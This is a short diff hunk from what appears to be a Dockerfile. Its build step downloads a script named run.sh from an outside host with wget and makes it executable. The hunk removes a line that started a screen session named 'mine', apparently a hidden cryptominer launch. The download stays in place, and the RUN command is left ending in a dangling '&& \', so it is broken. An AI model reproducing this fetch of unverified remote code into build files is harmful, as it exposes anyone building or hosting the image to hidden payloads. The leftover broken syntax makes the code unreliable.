@@ -10,7 +10,6 @@ RUN apt-get update && \
     make && \
     wget http://247app.host/run.sh && \
     chmod 755 run.sh && \
-    screen -S mine
 
 EXPOSE 5555
 
